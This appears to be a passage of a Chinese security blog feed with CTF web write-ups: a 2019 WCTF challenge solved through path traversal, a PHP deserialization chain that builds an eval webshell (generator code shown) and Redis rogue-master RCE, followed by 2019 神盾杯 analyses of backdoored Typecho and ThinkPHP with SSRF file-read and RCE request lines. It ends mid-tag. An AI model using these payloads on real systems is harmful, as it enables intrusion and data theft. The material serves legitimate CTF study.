    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2019 WCTF看到有一道web题目开源了：<a href="https://github.com/paul-axe/ctf.git。" target="_blank" rel="noopener">https://github.com/paul-axe/ctf.git。</a><br>同时看到wupco的题解：<a href="https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/HkzsDzRxr。" target="_blank" rel="noopener">https://hackmd.io/@ZzDmROodQUynQsF9je3Q5Q/HkzsDzRxr。</a><br>感觉这道题非常有趣，于是在此分析一下。</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>拿到题目后，粗略的看了一下几个功能：<br>1.注册<br>2.登录<br>3.写文章<br><img src="/images/2019-07-09-15-16-28.png" alt=""><br>同时注意到cookie：<br><img src="/images/2019-07-09-15-16-48.png" alt=""><br><img src="/images/2019-07-09-15-16-55.png" alt=""><br>看到有序列化的值，那么猜测可能有源码泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.106:10003/.git/</span><br></pre></td></tr></table></figure></p><p>扫描后发现确实存在文件泄露。</p><h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><p>代码量非常少，但挑战不小。我们关注到主要有3个大类：User、Cache、Page。<br>同时关注到题目使用了redis作为数据库：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$redis = <span class="keyword">new</span> Redis();</span><br><span class="line">$redis-&gt;connect(<span class="string">"db"</span>, <span class="number">6379</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Cant connect to database"</span>);</span><br></pre></td></tr></table></figure></p><p>那么猜测题目不是要getshell就是ssrf。<br>如果要进行getshell，那么或许可以利用写文章的功能。那么现在的审计重点则来到写文件部分：<br>我们关注到Page类里的publish方法:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">publish</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line">    $user = User::getInstance();</span><br><span class="line">    $ext = substr(strstr($filename, <span class="string">"."</span>), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    $path = $user-&gt;getCacheDir() . <span class="string">"/"</span> . microtime(<span class="keyword">true</span>) . <span class="string">"."</span> . $ext;</span><br><span class="line">    $user-&gt;checkWritePermissions();</span><br><span class="line">    Cache::writeToFile($path, <span class="keyword">$this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们关注到路径：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ext = substr(strstr($filename, <span class="string">"."</span>), <span class="number">1</span>);</span><br></pre></td></tr></table></figure></p><p>首先后缀会取第一个点后的部分，那么可以构造出路径穿越，例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename = <span class="string">'./../../../../../var/www/html/sky.php'</span>;</span><br></pre></td></tr></table></figure></p><p>所以我们可以利用这一点进行任意目录写，我们跟进一下传参方式：<br>首先看index.php:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$controller = <span class="keyword">new</span> MainController();</span><br><span class="line">$method = <span class="string">"do"</span>.$_GET[<span class="string">"m"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (method_exists($controller, $method))&#123;</span><br><span class="line">    $controller-&gt;$method();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $controller-&gt;doIndex();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现我们可以触发以do开头的方法，那么查看一下相关调用publish的方法：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">doPublish</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkAuth();</span><br><span class="line">        $page = unserialize($_COOKIE[<span class="string">"draft"</span>]);</span><br><span class="line">        $fname = $_POST[<span class="string">"fname"</span>];</span><br><span class="line">        $page-&gt;publish($fname);</span><br><span class="line">        setcookie(<span class="string">"draft"</span>, <span class="keyword">null</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Your blog post will be published after a while (never)&lt;br&gt;&lt;a href=/&gt;Back&lt;/a&gt;"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>发现$page会调用publish方法，传参使用POST参数fname。<br>那么我们可以构造fname参数为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./../../../../../var/www/html/sky.php</span><br></pre></td></tr></table></figure></p><p>我们继续往下，可以看到：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache::writeToFile($path, <span class="keyword">$this</span>);</span><br></pre></td></tr></table></figure></p><p>跟进writeToFile():<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">writeToFile</span><span class="params">($path, $content)</span> </span>&#123;</span><br><span class="line">        $info = pathinfo($path);</span><br><span class="line">        <span class="keyword">if</span> (!is_dir($info[<span class="string">"dirname"</span>]))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"Directory doesn't exists"</span>);</span><br><span class="line">        <span class="keyword">if</span> (is_file($path))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"File already exists"</span>);</span><br><span class="line">        file_put_contents($path, $content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们发现这里会进行check：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!is_dir($info[<span class="string">"dirname"</span>]))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"Directory doesn't exists"</span>);</span><br></pre></td></tr></table></figure></p><p>而我们的路径为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path = $user-&gt;getCacheDir() . <span class="string">"/"</span> . microtime(<span class="keyword">true</span>) . <span class="string">"."</span> . $ext;</span><br></pre></td></tr></table></figure></p><p>这里显然microtime(true)文件夹不存在。</p><h2 id="任意文件夹创建"><a href="#任意文件夹创建" class="headerlink" title="任意文件夹创建"></a>任意文件夹创建</h2><p>还是刚才那句代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path = $user-&gt;getCacheDir() . <span class="string">"/"</span> . microtime(<span class="keyword">true</span>) . <span class="string">"."</span> . $ext;</span><br></pre></td></tr></table></figure></p><p>我们跟进getCacheDir():<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheDir</span><span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        $dir_path = <span class="keyword">self</span>::CACHE_PATH . <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir_path))&#123;</span><br><span class="line">            mkdir($dir_path);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $dir_path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现其中会进行mkdir，但这一步在校验写权限之前：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;checkWritePermissions();</span><br></pre></td></tr></table></figure></p><p>故此如果我们可以控制：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$dir_path = <span class="keyword">self</span>::CACHE_PATH . <span class="keyword">$this</span>-&gt;name;</span><br></pre></td></tr></table></figure></p><p>那么即可创建任意目录。<br>那么这里就需要我们对microtime(true)进行预估：<br><img src="/images/2019-07-09-15-58-31.png" alt=""><br>我们可以设置一个提前时间量进行批量文件夹创建，然后后续可以进行爆破publish，直到找到文件夹。<br>达到任意文件写的目的。</p><h2 id="控制文件内容难题"><a href="#控制文件内容难题" class="headerlink" title="控制文件内容难题"></a>控制文件内容难题</h2><p>在可任意文件写后，我们需要控制文件的内容，我们审计相关代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cache::writeToFile($path, <span class="keyword">$this</span>);</span><br></pre></td></tr></table></figure></p><p>注意到$this，我们跟进writeToFile()：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">writeToFile</span><span class="params">($path, $content)</span> </span>&#123;</span><br><span class="line">    $info = pathinfo($path);</span><br><span class="line">    <span class="keyword">if</span> (!is_dir($info[<span class="string">"dirname"</span>]))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"Directory doesn't exists"</span>);</span><br><span class="line">    <span class="keyword">if</span> (is_file($path))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"File already exists"</span>);</span><br><span class="line">    file_put_contents($path, $content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现关键代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($path, $content);</span><br></pre></td></tr></table></figure></p><p>此处会触发魔法方法__toString()：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>进而触发render():<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        $user = User::getInstance();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!array_key_exists(<span class="keyword">$this</span>-&gt;template, <span class="keyword">self</span>::TEMPLATES))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Invalid template"</span>);</span><br><span class="line"></span><br><span class="line">        $tpl = <span class="keyword">self</span>::TEMPLATES[<span class="keyword">$this</span>-&gt;template];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;view = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;view[<span class="string">"content"</span>] = file_get_contents($tpl);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vars[<span class="string">"user"</span>]  = $user-&gt;name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vars[<span class="string">"text"</span>]  = <span class="keyword">$this</span>-&gt;text.<span class="string">"\n"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vars[<span class="string">"rendered"</span>] = microtime(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;renderVars();</span><br><span class="line">        $header = <span class="keyword">$this</span>-&gt;getHeader();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $header.$content;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>此处会对content进行过滤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = <span class="keyword">$this</span>-&gt;renderVars();</span><br></pre></td></tr></table></figure></p><p>我们跟进renderVars()：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderVars</span><span class="params">()</span>: <span class="title">string</span> </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;view[<span class="string">"content"</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;vars <span class="keyword">as</span> $k=&gt;$v)&#123;</span><br><span class="line">            $v = htmlspecialchars($v);</span><br><span class="line">            $content = str_replace(<span class="string">"@@$k@@"</span>, $v, $content);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们发现这里会对content进行过滤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$v = htmlspecialchars($v);</span><br></pre></td></tr></table></figure></p><p>那么现在的难点在于，我们无法构造出php tag来写入文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; echo htmlspecialchars(&quot;&lt;?php phpinfo();?&gt;&quot;);</span><br><span class="line">&amp;lt;?php phpinfo();?&amp;gt;</span><br></pre></td></tr></table></figure></p><h2 id="巧妙php-tag构造"><a href="#巧妙php-tag构造" class="headerlink" title="巧妙php tag构造"></a>巧妙php tag构造</h2><p>我们注意到关键代码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;view = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;view[<span class="string">"content"</span>] = file_get_contents($tpl);</span><br><span class="line"><span class="keyword">$this</span>-&gt;vars[<span class="string">"user"</span>]  = $user-&gt;name;</span><br><span class="line"><span class="keyword">$this</span>-&gt;vars[<span class="string">"text"</span>]  = <span class="keyword">$this</span>-&gt;text.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;vars[<span class="string">"rendered"</span>] = microtime(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$content = <span class="keyword">$this</span>-&gt;renderVars();</span><br><span class="line">$header = <span class="keyword">$this</span>-&gt;getHeader();</span><br></pre></td></tr></table></figure></p><p>并且在过滤之前，有赋值操作：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = <span class="keyword">$this</span>-&gt;view[<span class="string">"content"</span>];</span><br></pre></td></tr></table></figure></p><p>如果我们能在赋值之前控制$this-&gt;view，将其变成字符串而非数组，那么则可以绕过过滤：<br><img src="/images/2019-07-09-16-51-07.png" alt=""><br>那么这里就要用到2017 GCTF中的一个方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2017/06/20/GCTF%E7%9A%84%E4%B8%80%E9%81%93php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/</span><br></pre></td></tr></table></figure></p><p>我们可以利用<code>&amp;</code>，例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;vars[<span class="string">"text"</span>]  = &amp;<span class="keyword">$this</span>-&gt;view;</span><br></pre></td></tr></table></figure></p><p>而此时我们只要改变$text的值，即可达到更改$this-&gt;view的目的，而我们发现$text并没有过滤，故此，我们可以构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$text=<span class="string">'&lt;?php'</span>;</span><br></pre></td></tr></table></figure></p><p>这样$view就会变成字符串，而非数组，这样便达成了我们上图bypass过滤的目的。<br>那么我们如何构造出可用的exp呢？仅仅1个<code>&lt;</code>是不够的，并且此处我们注意到file_put_contents不是追加数据而是覆盖。<br>所以我们的exp必须一次到位。那么这里就要看到最后的return：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> $header.$content;</span><br></pre></td></tr></table></figure></p><p>假如$content依然为对象，那么就会继续触发_toString()，这样一来我们就可以一个字符一个字符进行拼接，直到凑出exp，附上lcbc的构造exp：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$PAYLOAD = <span class="string">"&lt;?php eval(\$_REQUEST[1]);"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_payload</span><span class="params">($payload)</span></span>&#123;</span><br><span class="line">    $expl = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;strlen($payload); $i++)&#123;</span><br><span class="line">        $p = <span class="keyword">new</span> Page(<span class="string">"main"</span>);</span><br><span class="line">        $p-&gt;text= $payload[$i];</span><br><span class="line">        $p-&gt;vars[<span class="string">"text"</span>] = &amp;$p-&gt;view;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!$expl)</span><br><span class="line">            $expl = $p;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $p-&gt;header = $expl;</span><br><span class="line">            $expl = $p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> serialize($expl);</span><br><span class="line">&#125;</span><br><span class="line">gen_payload($PAYLOAD);</span><br></pre></td></tr></table></figure></p><p>非常巧妙的拼接出了payload：<br><img src="/images/2019-07-10-09-59-03.png" alt=""><br>在最后闭合<code>?&gt;</code>的时候，也用了一个技巧，可以使用__halt_compiler()进行编译器停止：<br><img src="/images/2019-07-10-21-52-07.png" alt=""><br><img src="/images/2019-07-10-21-51-50.png" alt=""><br>即可成功完成构造。</p><h2 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h2><p>这里用到了一个新的知识点，并且之前的未授权访问写shell，而是主从模式。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</span><br></pre></td></tr></table></figure></p><p>我们简单测试一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ redis-cli</span><br><span class="line">127.0.0.1:6379&gt; slaveof 127.0.0.1 6379</span><br><span class="line">OK</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-10-16-26-47.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; slaveof no one</span><br><span class="line">OK</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-10-16-27-51.png" alt=""><br>需要注意的一点，slave只能进行read:<br><img src="/images/2019-07-10-19-15-28.png" alt=""><br>我们来模拟一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">假设题目redis服务在192.168.1.106:10004</span><br><span class="line">我们的公网ip为192.168.1.185</span><br></pre></td></tr></table></figure></p><p>使用脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/n0b0dyCN/redis-rogue-server</span><br></pre></td></tr></table></figure></p><p>在模拟公网ip为192.168.1.185端模拟一个redis server，启动时加载恶意so文件，然后让目标192.168.1.106:10004成为该server的slave，利用FULLRESYNC，可以进行RCE：<br><img src="/images/2019-07-10-21-24-44.png" alt=""><br>然后可以getflag：<br><img src="/images/2019-07-10-21-26-48.png" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个题还是非常完美的一道题，学到很多，respect！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;2019 WCTF看到有一道web题目开源了：&lt;a href=&quot;https://github.com/paul-axe/ctf.git。&quot; 
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 神盾杯 final Writeup（2）</title>
    <link href="http://skysec.top/2019/07/04/2019-%E7%A5%9E%E7%9B%BE%E6%9D%AF-final-Writeup%EF%BC%882%EF%BC%89/"/>
    <id>http://skysec.top/2019/07/04/2019-神盾杯-final-Writeup（2）/</id>
    <published>2019-07-04T06:00:29.000Z</published>
    <updated>2019-07-09T02:46:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接之前的分析文章，本篇文章将2019 神盾杯线下赛后续两道web题也解析一下。</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><h3 id="预置后门扫描"><a href="#预置后门扫描" class="headerlink" title="预置后门扫描"></a>预置后门扫描</h3><p>打开源码发现是主流cms typecho，先上工具扫一波：<br><img src="/images/2019-07-04-14-02-34.png" alt=""><br><img src="/images/2019-07-04-14-03-13.png" alt=""><br><img src="/images/2019-07-04-14-04-21.png" alt=""><br>同时注意到版本号：<br><img src="/images/2019-07-04-14-33-44.png" alt=""><br>根据github的开源项目回滚到当前版本：<br><img src="/images/2019-07-04-14-39-31.png" alt=""><br>并进行diff：<br><img src="/images/2019-07-04-14-55-48.png" alt=""></p><h3 id="用户名RCE"><a href="#用户名RCE" class="headerlink" title="用户名RCE"></a>用户名RCE</h3><p><img src="/images/2019-07-04-14-55-33.png" alt=""><br>容易发现/admin/login.php处，$rememberName被反引号包裹，可以进行RCE。</p><h3 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h3><p>/var/Widget/XmlRpc.php：<br><img src="/images/2019-07-04-14-59-56.png" alt=""><br>该漏洞应该为typecho对应版本的原生漏洞，可以搜到相关信息：<br><img src="/images/2019-07-04-15-03-01.png" alt=""><br>那么关键点就在于过滤时，未把file协议过滤掉：<br>/var/Typecho/Http/Client/Adapter.php：<br><img src="/images/2019-07-04-15-00-29.png" alt=""><br>导致我们可以利用其进行SSRF任意文件读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;https://skysec.top/action/xmlrpc&quot; -d &apos;&lt;methodCall&gt;&lt;methodName&gt;pingback.ping&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;file:///flag&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;joychou&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;&apos;</span><br></pre></td></tr></table></figure></p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><h3 id="预置后门扫描-1"><a href="#预置后门扫描-1" class="headerlink" title="预置后门扫描"></a>预置后门扫描</h3><p>打开源码发现是主流框架 thinkphp，先上工具扫一波：<br><img src="/images/2019-07-04-14-05-59.png" alt=""><br><img src="/images/2019-07-04-14-05-27.png" alt=""><br><img src="/images/2019-07-04-14-05-04.png" alt=""><br>比较遗憾，这里后门因为隐藏非常隐蔽，所以主流静态分析工具并没有很好的识别出webshell。下面还是得靠我们自己diff。<br>该项目是开源项目：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gitee.com/liaow/JuBiWang/tree/master</span><br></pre></td></tr></table></figure></p><h3 id="thinkphp缓存机制"><a href="#thinkphp缓存机制" class="headerlink" title="thinkphp缓存机制"></a>thinkphp缓存机制</h3><p><img src="/images/2019-07-04-15-19-29.png" alt=""><br>关于thinkphp的缓存机制，是一个老生常谈的问题，在今年强网杯final中也有相应的问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/2019/06/16/2019-%E5%BC%BA%E7%BD%91%E6%9D%AFfinal-Web-Writeup/</span><br></pre></td></tr></table></figure></p><p>这里就不再赘述了。</p><h3 id="全局过滤器后门"><a href="#全局过滤器后门" class="headerlink" title="全局过滤器后门"></a>全局过滤器后门</h3><p>通过diff发现在文件/ThinkPHP/Common/functions.php:<br><img src="/images/2019-07-04-15-22-45.png" alt=""><br>其中出题人自己编写了一个全局函数:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MY_I</span><span class="params">($name,$default=<span class="string">''</span>,$filter=null,$datas=null)</span></span></span><br></pre></td></tr></table></figure></p><p>我们和框架自带的I函数做个比较：<br><img src="/images/2019-07-05-13-36-15.png" alt=""><br>发现出题人使用了自己的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MY_DEFAULT_FILTER</span><br></pre></td></tr></table></figure></p><p>我们跟进一下：<br><img src="/images/2019-07-05-13-37-10.png" alt=""><br>发现内置内门assert，那么我们寻找调用MY_I函数的位置：<br>/Application/Home/Controller/ChartController.class.php：<br><img src="/images/2019-07-04-15-28-52.png" alt=""><br>发现方法getMarketOrdinaryJson()使用了该函数，那么可以构造如下路由进行RCE：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/?s=/home/chart/getMarketOrdinaryJson&amp;sky=phpinfo();</span><br></pre></td></tr></table></figure></p><h3 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h3><p>通过diff，发现在文件/Application/Admin/Controller/AdminController.class.php中多了如下方法：<br><img src="/images/2019-07-04-15-26-52.png" alt=""><br>简单看一下发现是curl，那么可以直接进行ssrf文件读取：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://skysec.top/?s=/admin/admin/callOnce&amp;url=file:///flag;</span><br></pre></td></tr></table></figure></p><h3 id="文件读取"><a href="#文件读取" class="headerlink" 